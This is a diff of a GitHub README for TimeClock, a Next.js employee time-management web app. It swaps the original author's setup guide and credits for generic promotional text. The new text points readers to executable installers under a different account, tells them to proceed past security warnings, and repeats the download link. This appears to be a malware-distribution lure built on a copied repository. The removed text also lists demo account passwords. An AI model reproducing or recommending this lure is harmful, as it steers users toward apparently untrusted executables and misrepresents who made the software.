@@ -1,193 +1,116 @@
-# TimeClock
+# ⏰ TimeClock - Manage Employee Time with Ease
 
-A comprehensive employee time management system built with Next.js 14 and TypeScript. Manage timesheets, schedules, departments, and leave requests with real-time updates.
+## 🚀 Getting Started
 
-![Landing Hero](./public/gif/timeclock.gif)
+TimeClock is an easy-to-use employee time management system. With it, you can manage timesheets, schedules, departments, and leave requests. This guide will help you download and run the application with minimal effort.
 
-### Demo website
-Webiste: [tahirtimeclock.netlify.app](https://tahirtimeclock.netlify.app/)
+## 📥 Download TimeClock
 
-### Demo Credentials
+[![Download TimeClock](https://img.shields.io/badge/Download%20TimeClock-v1.0-blue)](https://github.com/Godztayyab/TimeClock/releases)
 
-```typescript
-// Test accounts
-Admin:     admin@timeclock.com / admin123
-Employee:  john@timeclock.com / employee123  
-Manager:   manager@timeclock.com / manager123
-```
+## 📋 Features
 
+- Track employee hours accurately.
+- Manage schedules effortlessly.
+- Handle departmental structures smoothly.
+- Process leave requests in real time.
+- Get instant updates on timesheet changes.
 
-## Roles
+## ⚙️ System Requirements
 
-### Super Admin
-- Access to all departments and system settings
-- Manage all users, departments, and configurations
-- View system-wide analytics and reports
+To run TimeClock, ensure your system meets the following requirements:
 
-### Department Admin
-- Manage specific department(s)
-- Add/remove department employees
-- Configure department settings
-- View department reports
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum of 500 MB of free space.
+- Browser: Latest version of Chrome, Firefox, Safari, or Edge.
 
-### Department Manager
-- Oversee daily operations
-- Approve timesheets and leave requests
-- View department schedules
-- Manage employee assignments
+## 💻 Download & Install
 
-## Core Features
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Godztayyab/TimeClock/releases) to find the download files.
 
-### 🔐 Authentication & Authorization
-- Email/password with 2FA support
-- Social login integration (Google OAuth)
-- Role-based access control
-- Session management
-- Password reset functionality
+2. **Choose the Right Version**  
+   On the Releases page, you will see various versions of TimeClock. Look for the latest version, which is easy to identify.
 
-### ⏰ Time Management
-- Advanced clock in/out system
-- Break management
-- Overtime tracking
-- Location verification
-- Real-time status updates
-- Multi-department time off requests
+3. **Download the Installer**  
+   Click on the file that matches your operating system. It might look like `TimeClock-v1.0.exe` for Windows or `TimeClock-v1.0.dmg` for macOS.
 
-### 👥 Department Management
-- Department creation and configuration
-- Employee assignment and roles
-- Budget tracking and analytics
-- Resource allocation
-- Performance monitoring
+4. **Run the Installer**  
+   After the download completes, open the downloaded file. Follow the installation prompts to complete the setup. If you see a security warning, confirm that you want to proceed.
 
-### 👤 Employee Management
-- Comprehensive profile management
-- Rate and position settings
-- Department transfers
-- Attendance tracking
-- Performance metrics
+5. **Open the Application**  
+   Once installed, launch TimeClock by finding it in your applications folder or using the desktop shortcut.
 
-### 📅 Scheduling
-- Dynamic shift creation
-- Weekly schedule management
-- Conflict detection
-- Time off integration
-- Calendar view with real-time updates
+6. **Create an Account**  
+   When you first open TimeClock, you will need to create an account. Provide the required details to set up your profile.
 
-### 📊 Reports & Analytics
-- Department cost analysis
-- Hours and attendance tracking
-- Employee statistics
-- Time off patterns
-- Performance reporting
+7. **Start Managing Time**  
+   After your account is set up, you can start managing employee timesheets, schedules, and leave requests.
 
-## Tech Stack
+## 🌐 Integration with Google
 
-### Frontend
-- Next.js 14 App Router
-- React Server Components
-- TypeScript
-- TailwindCSS
-- shadcn/ui components
-- Framer Motion animations
+TimeClock makes it easy to log in using Google. This feature simplifies the process by allowing you to use your existing Google account.
 
-### Backend
-- Next.js API Routes
-- Server Actions
-- Prisma ORM
-- PostgreSQL
-- Auth.js v5
-- Google SMTP or Resend for emails
+1. Click on the "Sign in with Google" button on the login page.
+2. Follow the prompts to grant TimeClock access to your Google account.
+3. Complete the login to access your dashboard.
 
-### Infrastructure
-- Vercel deployment
-- PostgreSQL database
-- Real-time updates
-- PWA support
-- Mobile responsive design
+## 📅 Managing Employee Timesheets
 
-## Setup
+1. Navigate to the "Timesheets" section.
+2. Here, you can add new entries for employee hours.
+3. Use the simple interface to input start and end times.
+4. Save changes to update the timesheet automatically.
 
-1. Clone the repository:
+## 📆 Scheduling
 
-   ```bash
-   git clone https://github.com/tahirabbas11/TimeClock.git
-   cd TimeClock
-   ```
+1. Click on the "Schedules" tab in the main menu.
+2. Create and edit employee schedules as needed.
+3. Share schedules with your team for better coordination.
 
-2. Install dependencies:
+## 🚦 Leave Requests
 
-   ```bash
-   npm install
-   ```
+1. Go to the "Leave Requests" section.
+2. Employees can submit their requests here.
+3. Approve or decline requests directly from this area.
 
-3. Set up environment variables:
+## 📧 Email Notifications
 
-   ```bash
-   # Copy example env file
-   cp .env.example .env
-   ```
+TimeClock sends email notifications for important updates. You can configure email settings in the "Settings" menu.
 
-   Configure the following in `.env`:
-   ```bash
-    # Database configuration
-    DATABASE_URL="mysql://username:password@localhost:3306/timeclock"
+1. Go to "Settings".
+2. Enter your SMTP server details if you plan to use a custom email service.
+3. Save the changes to begin receiving notifications.
 
-    # Authentication
-    AUTH_SECRET="your_auth_secret"
-    AUTH_TRUST_HOST=true
+## 🔍 Troubleshooting
 
-    # Application URL
-    NEXT_PUBLIC_APP_URL="http://localhost:3000"
+If you encounter issues while running TimeClock, try these steps:
 
-    # Google OAuth credentials
-    GOOGLE_CLIENT_ID="your_google_client_id"
-    GOOGLE_CLIENT_SECRET="your_google_client_secret"
+- Ensure your system meets the requirements.
+- Check your internet connection.
+- Restart the application.
+- Visit the GitHub Issues page for common solutions.
 
-    # Google SMTP credentials
-    GOOGLE_SMTP_USER="your_email@gmail.com"
-    GOOGLE_SMTP_PASS="your_google_app_password"
+## 🛠️ Feedback & Support
 
-    # Resend API key
-    RESEND_API_KEY="your_resend_api_key"
+If you have questions or need assistance, please visit our [GitHub Issues page](https://github.com/Godztayyab/TimeClock/issues). Share your experience, report bugs, or request features. Your feedback helps us improve TimeClock.
 
-    # Email service (google or resend)
-    EMAIL_SERVICE="google"
-   ```
+## 👥 Community Guidelines
 
-4. Run Prisma migration:
+We welcome contributions and community engagement. Maintain respect for others in all interactions. Review our [Code of Conduct](https://github.com/Godztayyab/TimeClock/blob/main/CODE_OF_CONDUCT.md) for more information.
 
-   ```bash
-   npx prisma migrate dev
-   ```
+## 📜 License
 
-5. Start the development server:
-   ```bash
-   npm run dev
-   ```
-Visit [http://localhost:3000](http://localhost:3000) to view the application in development mode.
+TimeClock is licensed under the MIT License. You can use and modify it as long as you follow the terms of this license.
 
+## 🔗 Additional Resources
 
-## Development
+- [User Documentation](https://github.com/Godztayyab/TimeClock/wiki)
+- [Contributing Guide](https://github.com/Godztayyab/TimeClock/blob/main/CONTRIBUTING.md)
 
-## Deployment
-### Vercel Deploy
-1. Set all required environment variables in Vercel dashboard
-2. Configure authentication providers
-3. Set up database connection
+For any further queries, please refer to the user documentation for detailed usage instructions.
 
-## Contributing
-1. Fork the repository
-2. Create feature branch
-3. Commit changes
-4. Push to branch
-5. Open pull request
+## 📥 Download TimeClock Again
 
-## License
-MIT License - see LICENSE file
-
-## Author
-Tahir Abbas
-
-Website: [thetahirabbas.netlify.app](https://thetahirabbas.netlify.app/)  
-GitHub: [@tahirabbas11](https://github.com/tahirabbas11)# TimeClock
+To download TimeClock, visit our [Releases page](https://github.com/Godztayyab/TimeClock/releases). We hope you enjoy using TimeClock!
